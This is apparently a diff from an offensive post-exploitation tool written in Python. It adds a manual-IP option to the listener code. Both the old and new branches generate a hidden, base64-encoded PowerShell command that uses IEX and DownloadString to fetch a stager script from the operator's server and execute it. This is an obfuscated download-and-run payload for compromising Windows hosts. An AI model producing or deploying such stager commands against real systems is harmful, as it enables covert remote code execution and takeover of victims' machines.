@@ -30,8 +30,13 @@ def printListener():
         powershellStagerFile.write(windows_powershell_stager)
         powershellStagerFile.close()
     randoStagerDLPort = random.randint(5000,9000)
-    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
-    print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
+
+    if bindOrReverse == 'm':
+        FUNCTIONS().DoServe(manualIP, powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
+        print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + manualIP + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
+    else:
+        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
+        print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
 
     if bindOrReverse == 'b':
         if not '5556' in str(serverlist):
